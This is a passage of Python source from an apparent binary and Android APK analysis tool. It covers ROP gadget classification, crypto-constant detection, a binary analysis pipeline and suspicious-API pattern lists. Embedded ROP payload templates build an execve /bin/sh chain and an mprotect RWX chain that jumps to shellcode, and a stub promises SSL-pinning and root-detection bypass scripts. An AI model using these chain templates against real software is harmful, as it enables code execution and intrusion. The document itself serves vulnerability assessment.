            mprotect_chain_buildable=False, rop_difficulty='very_hard',
            error=str(e)
        )


def _classify_gadget(instructions: List[str]) -> str:
    """Classify a gadget by its primary operation."""
    first_instr = instructions[0].lower() if instructions else ''
    all_instrs = ' '.join(instructions).lower()
    
    if 'pop' in first_instr:
        return 'pop'
    elif 'syscall' in all_instrs or 'int 0x80' in all_instrs:
        return 'syscall'
    elif 'mov' in first_instr and '[' in first_instr:
        return 'write'
    elif 'xchg' in first_instr and 'sp' in first_instr:
        return 'pivot'
    elif 'leave' in all_instrs:
        return 'pivot'
    elif 'add' in first_instr or 'sub' in first_instr:
        return 'arithmetic'
    elif 'xor' in first_instr:
        return 'xor'
    elif 'mov' in first_instr:
        return 'mov'
    elif 'jmp' in first_instr:
        return 'jmp'
    elif 'call' in first_instr:
        return 'call'
    else:
        return 'other'


def _get_controlled_registers(instructions: List[str]) -> List[str]:
    """Get list of registers that are controllable via this gadget."""
    regs = []
    x86_regs = ['rax', 'rbx', 'rcx', 'rdx', 'rsi', 'rdi', 'rbp', 'rsp',
                'r8', 'r9', 'r10', 'r11', 'r12', 'r13', 'r14', 'r15',
                'eax', 'ebx', 'ecx', 'edx', 'esi', 'edi', 'ebp', 'esp']
    
    for instr in instructions:
        instr_lower = instr.lower()
        if instr_lower.startswith('pop '):
            for reg in x86_regs:
                if reg in instr_lower:
                    regs.append(reg)
        elif instr_lower.startswith('mov ') and ',' in instr_lower:
            # mov reg, ... - destination register is controlled
            dest = instr_lower.split(',')[0].replace('mov ', '')
            for reg in x86_regs:
                if reg in dest and '[' not in dest:
                    regs.append(reg)
    
    return list(set(regs))


def _calculate_gadget_quality(instructions: List[str]) -> float:
    """Calculate quality score for a gadget (0.0-1.0)."""
    quality = 1.0
    
    # Penalty for side effects
    side_effects = ['call', 'jmp', 'push']
    for instr in instructions[:-1]:  # Exclude final ret
        for se in side_effects:
            if se in instr.lower():
                quality -= 0.2
    
    # Bonus for clean gadgets
    clean_patterns = ['pop', 'ret']
    if all(any(p in i.lower() for p in clean_patterns) for i in instructions):
        quality += 0.3
    
    # Penalty for too many instructions
    if len(instructions) > 3:
        quality -= 0.1 * (len(instructions) - 3)
    
    return max(0.0, min(1.0, quality))


def _build_chain_templates(pop_gadgets: List[ROPGadget], 
                           syscall_gadgets: List[ROPGadget],
                           write_gadgets: List[ROPGadget],
                           pivot_gadgets: List[ROPGadget]) -> List[ROPChainTemplate]:
    """Build common ROP chain templates from available gadgets."""
    templates = []
    
    # Check for execve chain (/bin/sh)
    pop_rdi = next((g for g in pop_gadgets if 'rdi' in g.registers_controlled), None)
    pop_rsi = next((g for g in pop_gadgets if 'rsi' in g.registers_controlled), None)
    pop_rdx = next((g for g in pop_gadgets if 'rdx' in g.registers_controlled), None)
    pop_rax = next((g for g in pop_gadgets if 'rax' in g.registers_controlled), None)
    syscall = syscall_gadgets[0] if syscall_gadgets else None
    
    execve_available = [g for g in [pop_rdi, pop_rsi, pop_rdx, pop_rax, syscall] if g]
    execve_buildable = all([pop_rdi, pop_rsi, pop_rax, syscall])
    
    templates.append(ROPChainTemplate(
        name='execve_shell',
        description='Execute /bin/sh via execve syscall',
        required_gadgets=['pop rdi', 'pop rsi', 'pop rax', 'syscall'],
        available_gadgets=execve_available,
        is_buildable=execve_buildable,
        chain_addresses=[g.address for g in execve_available if g],
        payload_template='''
# Execve /bin/sh chain
rop = b""
rop += p64(pop_rdi) + p64(binsh_addr)     # rdi = "/bin/sh"
rop += p64(pop_rsi) + p64(0)               # rsi = NULL
rop += p64(pop_rdx) + p64(0)               # rdx = NULL (if available)
rop += p64(pop_rax) + p64(59)              # rax = 59 (execve)
rop += p64(syscall)
''' if execve_buildable else None
    ))
    
    # mprotect chain (make memory executable)
    mprotect_buildable = pop_rdi and pop_rsi and pop_rax and syscall
    
    templates.append(ROPChainTemplate(
        name='mprotect_rwx',
        description='Make memory region executable via mprotect',
        required_gadgets=['pop rdi', 'pop rsi', 'pop rdx', 'pop rax', 'syscall'],
        available_gadgets=[g for g in [pop_rdi, pop_rsi, pop_rdx, pop_rax, syscall] if g],
        is_buildable=mprotect_buildable,
        chain_addresses=[g.address for g in [pop_rdi, pop_rsi, pop_rdx, pop_rax, syscall] if g],
        payload_template='''
# mprotect RWX chain
rop = b""
rop += p64(pop_rdi) + p64(page_addr)       # rdi = page-aligned address
rop += p64(pop_rsi) + p64(0x1000)          # rsi = length
rop += p64(pop_rdx) + p64(7)               # rdx = PROT_READ|WRITE|EXEC
rop += p64(pop_rax) + p64(10)              # rax = 10 (mprotect)
rop += p64(syscall)
rop += p64(shellcode_addr)                  # jump to shellcode
''' if mprotect_buildable else None
    ))
    
    # Stack pivot template
    has_pivot = len(pivot_gadgets) > 0
    templates.append(ROPChainTemplate(
        name='stack_pivot',
        description='Pivot stack to controlled buffer',
        required_gadgets=['leave; ret', 'xchg rsp, X; ret'],
        available_gadgets=pivot_gadgets[:5],
        is_buildable=has_pivot,
        chain_addresses=[g.address for g in pivot_gadgets[:3]],
        payload_template='''
# Stack pivot (adjust rbp, then leave;ret)
# Prerequisite: control rbp to point to fake stack
rop = p64(leave_ret)  # will do: mov rsp, rbp; pop rbp; ret
''' if has_pivot else None
    ))
    
    return templates


def analyze_imports(data: bytes, metadata: BinaryMetadata) -> List[ImportedFunction]:
    """Extract and analyze imported functions."""
    imports = []
    
    # For PE files, we'd need to parse the import directory
    # For now, we'll extract function names from strings
    strings = extract_strings(data, min_length=4, max_strings=10000)
    
    for s in strings:
        value = s.value
        # Check against suspicious imports
        for import_name, reason in SUSPICIOUS_IMPORTS.items():
            if import_name.lower() in value.lower():
                imports.append(ImportedFunction(
                    name=import_name,
                    library="(detected in strings)",
                    is_suspicious=True,
                    reason=reason,
                ))
    
    # Deduplicate
    seen = set()
    unique_imports = []
    for imp in imports:
        if imp.name not in seen:
            seen.add(imp.name)
            unique_imports.append(imp)
    
    return unique_imports


# ============================================================================
# Cryptographic Constant Detection
# ============================================================================

# Well-known crypto constants for detection
CRYPTO_CONSTANTS = {
    # AES S-Box (first 32 bytes - enough for detection)
    "aes_sbox": {
        "bytes": bytes([0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5,
                       0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76,
                       0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0,
                       0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0]),
        "name": "AES S-Box",
        "algorithm": "AES",
        "description": "AES substitution box - indicates AES encryption",
    },
    # AES Inverse S-Box (first 32 bytes)
    "aes_inv_sbox": {
        "bytes": bytes([0x52, 0x09, 0x6a, 0xd5, 0x30, 0x36, 0xa5, 0x38,
                       0xbf, 0x40, 0xa3, 0x9e, 0x81, 0xf3, 0xd7, 0xfb,
                       0x7c, 0xe3, 0x39, 0x82, 0x9b, 0x2f, 0xff, 0x87,
                       0x34, 0x8e, 0x43, 0x44, 0xc4, 0xde, 0xe9, 0xcb]),
        "name": "AES Inverse S-Box",
        "algorithm": "AES",
        "description": "AES inverse substitution box - indicates AES decryption",
    },
    # DES S-Boxes (S1, first 8 values)
    "des_sbox1": {
        "bytes": bytes([14, 4, 13, 1, 2, 15, 11, 8]),
        "name": "DES S-Box 1",
        "algorithm": "DES/3DES",
        "description": "DES substitution box - indicates DES/3DES encryption",
    },
    # Blowfish P-Array (first 8 values as 32-bit ints in little endian)
    "blowfish_p": {
        "bytes": bytes([0x43, 0xf5, 0xa8, 0x24, 0x3c, 0x93, 0x26, 0x09,
                       0xc4, 0x09, 0xd0, 0x38, 0x1e, 0x84, 0x6e, 0xf9]),
        "name": "Blowfish P-Array",
        "algorithm": "Blowfish",
        "description": "Blowfish P-array initialization - indicates Blowfish cipher",
    },
    # SHA-256 Initial Hash Values (first 8 bytes)
    "sha256_init": {
        "bytes": bytes([0x67, 0xe6, 0x09, 0x6a, 0x85, 0xae, 0x67, 0xbb]),
        "name": "SHA-256 Constants",
        "algorithm": "SHA-256",
        "description": "SHA-256 initial hash values - indicates SHA-256 hashing",
    },
    # SHA-512 Initial Hash Values (first 16 bytes)
    "sha512_init": {
        "bytes": bytes([0x08, 0xc9, 0xbc, 0xf3, 0x67, 0xe6, 0x09, 0x6a,
                       0x3b, 0xa7, 0xca, 0x84, 0x85, 0xae, 0x67, 0xbb]),
        "name": "SHA-512 Constants",
        "algorithm": "SHA-512",
        "description": "SHA-512 initial hash values - indicates SHA-512 hashing",
    },
    # MD5 Sine Constants (T table, first 8 bytes)
    "md5_sine": {
        "bytes": bytes([0x78, 0xa4, 0x6a, 0xd7, 0x56, 0xb7, 0xc7, 0xe8]),
        "name": "MD5 Sine Table",
        "algorithm": "MD5",
        "description": "MD5 sine constants - indicates MD5 hashing (WEAK!)",
    },
    # RC4 Initial State Indicator (sequence 0-7)
    "rc4_state": {
        "bytes": bytes([0, 1, 2, 3, 4, 5, 6, 7]),
        "name": "RC4 State Array",
        "algorithm": "RC4",
        "description": "RC4 state initialization sequence - indicates RC4 cipher (WEAK!)",
    },
    # ChaCha20 Constant "expand 32-byte k"
    "chacha_const": {
        "bytes": b"expand 32-byte k",
        "name": "ChaCha20 Constant",
        "algorithm": "ChaCha20",
        "description": "ChaCha20 magic constant - indicates ChaCha20 stream cipher",
    },
    # Salsa20 Constant "expand 32-byte k"
    "salsa_const": {
        "bytes": b"expand 32-byte k",
        "name": "Salsa20 Constant",
        "algorithm": "Salsa20",
        "description": "Salsa20 magic constant - indicates Salsa20 stream cipher",
    },
    # RSA Public Exponent (65537 in various representations)
    "rsa_65537_be": {
        "bytes": bytes([0x00, 0x01, 0x00, 0x01]),
        "name": "RSA Public Exponent",
        "algorithm": "RSA",
        "description": "Common RSA public exponent 65537 - indicates RSA encryption",
    },
    # PKCS#7 Padding Pattern
    "pkcs7_pad": {
        "bytes": bytes([0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10,
                       0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10]),
        "name": "PKCS#7 Padding",
        "algorithm": "Padding",
        "description": "PKCS#7 block padding - indicates block cipher usage",
    },
    # CRC32 Polynomial Table (first 8 bytes)
    "crc32_poly": {
        "bytes": bytes([0x00, 0x00, 0x00, 0x00, 0x96, 0x30, 0x07, 0x77]),
        "name": "CRC32 Polynomial",
        "algorithm": "CRC32",
        "description": "CRC32 polynomial table - indicates CRC32 checksum",
    },
    # Twofish MDS Matrix (first 8 bytes)
    "twofish_mds": {
        "bytes": bytes([0x01, 0xef, 0x5b, 0x5b, 0x5b, 0xef, 0xef, 0x01]),
        "name": "Twofish MDS Matrix",
        "algorithm": "Twofish",
        "description": "Twofish MDS matrix - indicates Twofish cipher",
    },
}

# Weak crypto patterns to flag
WEAK_CRYPTO_PATTERNS = {
    "MD5", "MD4", "SHA-1", "SHA1", "DES", "RC4", "RC2", "ECB",
}


def detect_crypto_constants(data: bytes) -> List[Dict[str, Any]]:
    """
    Detect cryptographic constants in binary data.
    This helps identify which crypto algorithms are used in the binary.
    
    Returns:
        List of detected crypto constants with offsets and metadata.
    """
    findings = []
    data_len = len(data)
    
    for const_id, const_info in CRYPTO_CONSTANTS.items():
        pattern = const_info["bytes"]
        pattern_len = len(pattern)
        
        # Search for the pattern in the binary
        offset = 0
        while offset < data_len:
            pos = data.find(pattern, offset)
            if pos == -1:
                break
            
            # Check if this is likely a false positive (in string sections, etc.)
            is_weak = const_info["algorithm"] in WEAK_CRYPTO_PATTERNS
            
            findings.append({
                "constant": const_info["name"],
                "algorithm": const_info["algorithm"],
                "description": const_info["description"],
                "offset": hex(pos),
                "offset_decimal": pos,
                "is_weak_crypto": is_weak,
                "severity": "high" if is_weak else "info",
            })
            
            # Move past this match to find more
            offset = pos + pattern_len
    
    # Also look for string-based crypto indicators
    crypto_strings = [
        (b"AES", "AES", "AES encryption/decryption"),
        (b"RSA", "RSA", "RSA public-key cryptography"),
        (b"DES", "DES/3DES", "DES encryption (WEAK!)"),
        (b"Blowfish", "Blowfish", "Blowfish cipher"),
        (b"Rijndael", "AES/Rijndael", "Rijndael (AES) cipher"),
        (b"ECDSA", "ECDSA", "Elliptic Curve Digital Signature"),
        (b"ECDH", "ECDH", "Elliptic Curve Diffie-Hellman"),
        (b"Ed25519", "Ed25519", "Ed25519 signature scheme"),
        (b"X25519", "X25519", "X25519 key exchange"),
        (b"HMAC", "HMAC", "HMAC authentication"),
        (b"PBKDF2", "PBKDF2", "Password-based key derivation"),
        (b"scrypt", "scrypt", "scrypt key derivation"),
        (b"bcrypt", "bcrypt", "bcrypt password hashing"),
        (b"argon2", "Argon2", "Argon2 password hashing"),
    ]
    
    for pattern, algo, desc in crypto_strings:
        offset = 0
        count = 0
        first_offset = None
        while offset < data_len and count < 5:  # Limit to avoid flooding
            pos = data.find(pattern, offset)
            if pos == -1:
                break
            if first_offset is None:
                first_offset = pos
            count += 1
            offset = pos + len(pattern)
        
        if count > 0:
            is_weak = algo in WEAK_CRYPTO_PATTERNS
            findings.append({
                "constant": f"{algo} String Reference",
                "algorithm": algo,
                "description": desc,
                "offset": hex(first_offset) if first_offset else "N/A",
                "occurrence_count": count,
                "is_weak_crypto": is_weak,
                "severity": "high" if is_weak else "info",
            })
    
    # Deduplicate and sort by offset
    seen = set()
    unique_findings = []
    for f in findings:
        key = (f["constant"], f.get("offset", ""))
        if key not in seen:
            seen.add(key)
            unique_findings.append(f)
    
    return sorted(unique_findings, key=lambda x: x.get("offset_decimal", 0))


def analyze_binary(file_path: Path) -> BinaryAnalysisResult:
    """Perform complete analysis of a binary file."""
    try:
        with open(file_path, 'rb') as f:
            data = f.read()
        
        filename = file_path.name
        imports = []
        exports = []
        symbols = []
        dwarf_info = None
        disassembly = None
        data_flow_result = None
        type_recovery_result = None
        emulation_result = None
        
        # Try pefile first for PE files (better analysis)
        if PEFILE_AVAILABLE and data[:2] == b'MZ':
            metadata, imports, exports = parse_pe_with_pefile(file_path)
            if metadata:
                metadata.file_size = len(data)  # Update with actual size
        else:
            metadata = None
        
        # Try pyelftools for ELF files
        if not metadata and data[:4] == b'\x7fELF':
            if PYELFTOOLS_AVAILABLE:
                metadata, symbols, imports, exports, dwarf_info = parse_elf_with_pyelftools(file_path)
                
                # Perform disassembly if we have metadata
                if metadata and CAPSTONE_AVAILABLE:
                    disassembly = disassemble_binary(file_path, metadata, symbols)
                    
                    # Perform advanced analysis if disassembly succeeded
                    if disassembly and disassembly.functions:
                        # Build instruction map from all functions
                        all_instructions: Dict[int, DisassemblyInstruction] = {}
                        for func in disassembly.functions:
                            for instr in func.instructions:
                                all_instructions[instr.address] = instr
                        
                        # Data flow analysis
                        try:
                            data_flow_result = analyze_data_flow(
                                all_instructions, 
                                disassembly.control_flow_graph,
                                imports,
                                disassembly.architecture
                            )
                        except Exception as e:
                            logger.warning(f"Data flow analysis failed: {e}")
                            data_flow_result = None
                        
                        # Type recovery
                        try:
                            type_recovery_result = recover_types(
                                all_instructions,
                                disassembly.control_flow_graph,
                                disassembly.architecture
                            )
                        except Exception as e:
                            logger.warning(f"Type recovery failed: {e}")
                            type_recovery_result = None
                        
                        # Emulation analysis (if Unicorn available)
                        try:
                            emulation_result = emulate_binary(file_path, metadata)
                        except Exception as e:
                            logger.warning(f"Emulation analysis failed: {e}")
                            emulation_result = None
            
            # Fall back to basic ELF parsing
            if not metadata:
                metadata = parse_elf_header(data)
        
        # Fall back to basic PE parsing
        if not metadata and data[:2] == b'MZ':
            metadata = parse_pe_header(data)
        
        if not metadata:
            # Unknown binary format
            metadata = BinaryMetadata(
                file_type="Unknown binary",
                architecture="unknown",
                file_size=len(data),
            )
        
        # Extract strings
        strings = extract_strings(data, min_length=6, max_strings=3000)
        
        # Detect secrets
        secrets = detect_secrets_in_strings(strings)
        
        # Detect cryptographic constants
        crypto_findings = detect_crypto_constants(data)

        # Use LIEF for real import parsing fallback when possible
        if not imports:
            lief_imports, lief_exports, metadata_updates = _parse_imports_with_lief(file_path)
            if lief_imports:
                imports = lief_imports
            if not exports and lief_exports:
                exports = lief_exports
            if metadata_updates and metadata:
                linked_libs = metadata_updates.get("linked_libraries")
                if linked_libs and not metadata.linked_libraries:
                    metadata.linked_libraries = linked_libs

        # Analyze imports if not already done via pefile/pyelftools/LIEF
        if not imports:
            imports = analyze_imports(data, metadata)
        
        # Identify suspicious indicators
        suspicious = []
        
        # Add crypto detection findings
        if crypto_findings:
            weak_crypto = [f for f in crypto_findings if f.get("is_weak_crypto")]
            strong_crypto = [f for f in crypto_findings if not f.get("is_weak_crypto")]
            
            if weak_crypto:
                suspicious.append({
                    "category": " Weak Cryptography Detected",
                    "severity": "high",
                    "description": f"Found {len(weak_crypto)} weak/insecure crypto algorithms",
                    "details": [
                        {"algorithm": f["algorithm"], "offset": f["offset"], "description": f["description"]}
                        for f in weak_crypto[:10]
                    ],
                })
            
            if strong_crypto:
                suspicious.append({
                    "category": " Cryptographic Constants",
                    "severity": "info",
                    "description": f"Detected {len(strong_crypto)} cryptographic algorithm(s)",
                    "details": [
                        {"algorithm": f["algorithm"], "offset": f["offset"], "description": f["description"]}
                        for f in strong_crypto[:15]
                    ],
                })
        
        # Check for suspicious imports WITH CONTEXT AWARENESS
        # Don't flag common APIs in known-legitimate software
        suspicious_imports = [imp for imp in imports if imp.is_suspicious]
        
        # Check if this appears to be legitimate software
        is_likely_legitimate = False
        legitimacy_indicators = []
        
        # Check file name for known legitimate products
        filename_lower = filename.lower()
        for product in LEGITIMATE_PRODUCTS:
            if product in filename_lower:
                is_likely_legitimate = True
                legitimacy_indicators.append(f"Known product: {product}")
                break
        
        # Check strings for publisher info
        publisher_strings = [s.value.lower() for s in strings if s.category == "version" or "company" in s.value.lower() or "copyright" in s.value.lower()]
        for ps in publisher_strings:
            for pub in LEGITIMATE_PUBLISHERS:
                if pub in ps:
                    is_likely_legitimate = True
                    legitimacy_indicators.append(f"Known publisher: {pub}")
                    break
        
        # Check for digital signature indicators in strings
        has_signature_strings = any(
            any(sig in s.value.lower() for sig in ["authenticode", "signed by", "certificate", "verisign", "digicert"])
            for s in strings
        )
        if has_signature_strings:
            is_likely_legitimate = True
            legitimacy_indicators.append("Has signature indicators")
        
        # Filter suspicious imports based on legitimacy
        if is_likely_legitimate:
            # Only flag HIGH suspicion imports for legitimate software
            truly_suspicious = [
                imp for imp in suspicious_imports
                if IMPORT_SUSPICION_LEVEL.get(imp.name, "medium") == "high"
                or imp.name in ALWAYS_SUSPICIOUS_APIS
            ]
            if truly_suspicious:
                suspicious.append({
                    "category": " Unusual APIs for Legitimate Software",
                    "severity": "medium",
                    "description": f"Found {len(truly_suspicious)} unusual API calls (software appears legitimate: {', '.join(legitimacy_indicators[:2])})",
                    "details": [{"name": imp.name, "reason": imp.reason} for imp in truly_suspicious[:5]],
                })
            # Add legitimacy note
            suspicious.append({
                "category": " Legitimate Software Indicators",
                "severity": "info",
                "description": f"Binary appears to be legitimate software",
                "details": legitimacy_indicators[:5],
            })
        elif suspicious_imports:
            # Unknown software - apply normal suspicion levels
            high_suspicion = [imp for imp in suspicious_imports if IMPORT_SUSPICION_LEVEL.get(imp.name, "medium") in ("high", "medium")]
            if high_suspicion:
                suspicious.append({
                    "category": " Suspicious API Calls",
                    "severity": "high",
                    "description": f"Found {len(high_suspicion)} suspicious API calls",
                    "details": [{"name": imp.name, "reason": imp.reason, "level": IMPORT_SUSPICION_LEVEL.get(imp.name, "medium")} for imp in high_suspicion[:10]],
                })
        
        # Check if packed
        if metadata.is_packed:
            suspicious.append({
                "category": "Packed/Obfuscated",
                "severity": "medium",
                "description": f"Binary appears to be packed",
                "details": {"packer": metadata.packer_name},
            })
        
        # Check for anti-debugging
        anti_debug = any(s.value for s in strings if any(x in s.value for x in ["IsDebuggerPresent", "CheckRemoteDebuggerPresent", "OutputDebugString"]))
        if anti_debug:
            suspicious.append({
                "category": "Anti-Debugging",
                "severity": "medium",
                "description": "Binary contains anti-debugging techniques",
            })
        
        # Extract URLs
        urls = list(set(s.value for s in strings if s.category == "url"))
        if urls:
            suspicious.append({
                "category": "Network Indicators",
                "severity": "info",
                "description": f"Found {len(urls)} URLs",
                "details": urls[:20],
            })
        
        # Add ELF-specific security indicators
        if metadata.file_type.startswith("ELF"):
            security_features = []
            if metadata.nx_enabled:
                security_features.append("NX (No-Execute) enabled")
            else:
                suspicious.append({
                    "category": "Missing Security Feature",
                    "severity": "medium",
                    "description": "NX (No-Execute) not enabled - stack may be executable",
                })
            
            if metadata.pie_enabled:
                security_features.append("PIE (Position Independent Executable) enabled")
            else:
                suspicious.append({
                    "category": "Missing Security Feature",
                    "severity": "low",
                    "description": "PIE not enabled - ASLR less effective",
                })
            
            if metadata.stack_canary:
                security_features.append("Stack canary enabled")
            else:
                suspicious.append({
                    "category": "Missing Security Feature",
                    "severity": "medium",
                    "description": "Stack canary not detected - vulnerable to buffer overflows",
                })
            
            if metadata.relro == "Full":
                security_features.append("Full RELRO enabled")
            elif metadata.relro == "Partial":
                security_features.append("Partial RELRO enabled")
            else:
                suspicious.append({
                    "category": "Missing Security Feature",
                    "severity": "medium",
                    "description": "RELRO not enabled - GOT may be writable",
                })
            
            if security_features:
                suspicious.append({
                    "category": "Security Features",
                    "severity": "info",
                    "description": "Enabled security mitigations",
                    "details": security_features,
                })
        
        # Add disassembly findings
        if disassembly and disassembly.suspicious_instructions:
            suspicious.append({
                "category": "Suspicious Instructions",
                "severity": "high",
                "description": f"Found {len(disassembly.suspicious_instructions)} suspicious instruction patterns",
                "details": disassembly.suspicious_instructions[:10],
            })

        # YARA signature matches
        yara_matches = _run_yara_scan(data, file_path)
        if yara_matches:
            suspicious.append({
                "category": "YARA Matches",
                "severity": "medium",
                "description": f"Matched {len(yara_matches)} YARA rule(s)",
                "details": [{"rule": m.get("rule"), "tags": m.get("tags")} for m in yara_matches[:10]],
            })

        # Capa capability analysis
        capa_summary = _run_capa_scan(file_path)
        if capa_summary and capa_summary.get("rule_count"):
            suspicious.append({
                "category": "Capability Analysis",
                "severity": "info",
                "description": f"capa matched {capa_summary.get('rule_count')} capabilities",
                "details": capa_summary.get("capabilities", [])[:10],
            })

        # Fuzzy hashes and deobfuscated strings
        fuzzy_hashes = _compute_fuzzy_hashes(data)
        deobfuscated_strings = _deobfuscate_strings(strings)
        if deobfuscated_strings:
            suspicious.append({
                "category": "Deobfuscated Strings",
                "severity": "info",
                "description": f"Recovered {len(deobfuscated_strings)} deobfuscated strings",
            })
        
        # Add data flow analysis findings
        if data_flow_result:
            if data_flow_result.vulnerable_paths:
                for path in data_flow_result.vulnerable_paths[:5]:
                    suspicious.append({
                        "category": " Data Flow Vulnerability",
                        "severity": "high",
                        "description": f"Tainted data from {path.source.source_type} reaches {path.sink.function_name}",
                        "details": {
                            "source": f"{path.source.function_name} @ 0x{path.source.address:x}",
                            "sink": f"{path.sink.function_name} @ 0x{path.sink.address:x}",
                            "cwe": path.cwe_id,
                            "vulnerability": path.vulnerability_type,
                        },
                    })
        
        # Add type recovery findings
        if type_recovery_result:
            if type_recovery_result.functions:
                suspicious.append({
                    "category": " Type Recovery",
                    "severity": "info",
                    "description": f"Recovered {len(type_recovery_result.functions)} function signatures and {len(type_recovery_result.structs)} struct layouts",
                    "details": {
                        "functions": len(type_recovery_result.functions),
                        "structs": len(type_recovery_result.structs),
                        "total_types": type_recovery_result.total_types_recovered,
                    },
                })
        
        # Add emulation analysis findings
        if emulation_result:
            if emulation_result.decoded_strings:
                suspicious.append({
                    "category": " Emulation: Decoded Strings",
                    "severity": "medium",
                    "description": f"Emulation decoded {len(emulation_result.decoded_strings)} hidden strings",
                    "details": [s.decoded_value[:100] for s in emulation_result.decoded_strings[:10]],
                })
            
            if emulation_result.self_modifying_code:
                suspicious.append({
                    "category": " Self-Modifying Code",
                    "severity": "high",
                    "description": f"Detected {len(emulation_result.self_modifying_code)} instances of self-modifying code",
                    "details": emulation_result.self_modifying_code[:5],
                })
            
            if emulation_result.shellcode_detected:
                suspicious.append({
                    "category": " Shellcode Detected",
                    "severity": "critical",
                    "description": "Emulation detected shellcode patterns",
                })
            
            if emulation_result.anti_analysis_detected:
                suspicious.append({
                    "category": " Anti-Analysis Detected",
                    "severity": "medium",
                    "description": "Emulation detected anti-analysis behaviors",
                    "details": emulation_result.anti_analysis_detected[:5],
                })

        # Perform ROP gadget analysis for vulnerability assessment
        rop_result = None
        symbolic_result = None
        
        # ROP analysis - quick, helps assess exploitability
        try:
            rop_result = find_rop_gadgets(file_path, max_gadgets=500, max_gadget_length=6)
            
            if rop_result and rop_result.total_gadgets > 0:
                # Add ROP-related suspicious indicators
                if rop_result.execve_chain_buildable:
                    suspicious.append({
                        "category": " Exploitable: execve Chain Available",
                        "severity": "high",
                        "description": "ROP analysis shows an execve chain can be built for shell execution",
                        "details": {
                            "difficulty": rop_result.rop_difficulty,
                            "total_gadgets": rop_result.total_gadgets,
                            "useful_gadgets": len(rop_result.useful_gadgets),
                        },
                    })
                elif rop_result.mprotect_chain_buildable:
                    suspicious.append({
                        "category": " Exploitable: mprotect Chain Available",
                        "severity": "high",
                        "description": "ROP analysis shows mprotect chain can be built to bypass NX",
                        "details": {
                            "difficulty": rop_result.rop_difficulty,
                            "total_gadgets": rop_result.total_gadgets,
                        },
                    })
                elif rop_result.nx_bypass_possible:
                    suspicious.append({
                        "category": " NX Bypass Possible",
                        "severity": "medium",
                        "description": "Sufficient ROP gadgets exist to potentially bypass NX protection",
                        "details": {
                            "difficulty": rop_result.rop_difficulty,
                            "syscall_gadgets": len(rop_result.syscall_gadgets),
                        },
                    })
                else:
                    suspicious.append({
                        "category": " ROP Gadget Analysis",
                        "severity": "info",
                        "description": f"Found {rop_result.total_gadgets} ROP gadgets",
                        "details": {
                            "difficulty": rop_result.rop_difficulty,
                            "useful_gadgets": len(rop_result.useful_gadgets),
                        },
                    })
        except Exception as e:
            logger.debug(f"ROP gadget analysis skipped: {e}")

        return BinaryAnalysisResult(
            filename=filename,
            metadata=metadata,
            strings=strings[:500],  # Limit for response size
            imports=imports,
            exports=exports,
            secrets=secrets,
            suspicious_indicators=suspicious,
            fuzzy_hashes=fuzzy_hashes,
            yara_matches=yara_matches,
            capa_summary=capa_summary,
            deobfuscated_strings=deobfuscated_strings,
            symbols=symbols[:500],  # Limit for response size
            disassembly=disassembly,
            dwarf_info=dwarf_info,
            data_flow_analysis=data_flow_result,
            type_recovery=type_recovery_result,
            emulation_analysis=emulation_result,
            symbolic_execution=symbolic_result,
            rop_gadgets=rop_result,
        )
        
    except Exception as e:
        logger.error(f"Binary analysis failed: {e}")
        return BinaryAnalysisResult(
            filename=file_path.name,
            metadata=BinaryMetadata(file_type="error", architecture="unknown", file_size=0),
            strings=[],
            imports=[],
            exports=[],
            secrets=[],
            suspicious_indicators=[],
            fuzzy_hashes={},
            yara_matches=[],
            capa_summary=None,
            deobfuscated_strings=[],
            symbols=[],
            disassembly=None,
            dwarf_info=None,
            data_flow_analysis=None,
            type_recovery=None,
            emulation_analysis=None,
            symbolic_execution=None,
            rop_gadgets=None,
            error=str(e),
        )


# ============================================================================
# APK Analysis Functions
# ============================================================================

# Suspicious method patterns for DEX analysis
SUSPICIOUS_DEX_PATTERNS = {
    "reflection": [
        "java.lang.reflect", "getDeclaredMethod", "getDeclaredField",
        "setAccessible", "invoke", "getMethod", "forName",
    ],
    "crypto": [
        "javax.crypto", "Cipher", "SecretKey", "AES", "DES", "RSA",
        "MessageDigest", "Mac", "KeyGenerator", "KeyPairGenerator",
    ],
    "native": [
        "System.loadLibrary", "System.load", "Runtime.exec",
        "ProcessBuilder", "nativeLibraryDir",
    ],
    "dynamic_loading": [
        "DexClassLoader", "PathClassLoader", "dalvik.system.DexFile",
        "InMemoryDexClassLoader", "loadClass",
    ],
    "obfuscation": [
        "ProGuard", "DexGuard", "Allatori", "StringFog",
    ],
    "anti_analysis": [
        "isDebuggerConnected", "Debug.isDebuggerConnected",
        "android.os.Debug", "Xposed", "frida", "substrate",
    ],
    "data_exfiltration": [
        "getDeviceId", "getSubscriberId", "getSimSerialNumber",
        "getLine1Number", "getAccounts", "READ_CONTACTS",
    ],
    "root_detection": [
        "su", "/system/xbin/su", "/system/bin/su", "Superuser",
        "RootBeer", "isRooted", "checkRoot",
    ],
}

# Known tracker/SDK signatures
KNOWN_TRACKERS = {
    "com.google.firebase": "Firebase Analytics",
    "com.google.android.gms.analytics": "Google Analytics",
    "com.facebook.": "Facebook SDK",
    "com.appsflyer": "AppsFlyer",
    "com.adjust.sdk": "Adjust",
    "io.branch": "Branch.io",
    "com.amplitude": "Amplitude",
    "com.mixpanel": "Mixpanel",
    "com.segment": "Segment",
    "com.crashlytics": "Crashlytics",
    "io.sentry": "Sentry",
    "com.newrelic": "New Relic",
    "com.appdynamics": "AppDynamics",
    "com.google.ads": "Google Ads",
    "com.mopub": "MoPub",
    "com.unity3d.ads": "Unity Ads",
    "com.chartboost": "Chartboost",
    "com.vungle": "Vungle",
    "com.ironsource": "ironSource",
    "com.applovin": "AppLovin",
}


# ============================================================================
# Dynamic Analysis - Frida Script Generation
# ============================================================================

def generate_frida_scripts(
    package_name: str,
    strings: List[ExtractedString],
    dex_analysis: Optional[Dict[str, Any]],
    permissions: List[ApkPermission],
    urls: List[str],
    smali_analysis: Optional[Dict[str, Any]] = None
) -> Dict[str, Any]:
    """
    Generate Frida scripts for dynamic analysis based on static APK analysis.
    
    Creates targeted scripts for:
    - SSL pinning bypass
    - Root detection bypass
    - Crypto method hooking
    - Authentication hooks
    - Method tracing
    - Custom hooks for suspicious methods
    """
    scripts = []
    crypto_methods = []
    interesting_hooks = []
    ssl_pinning_detected = False
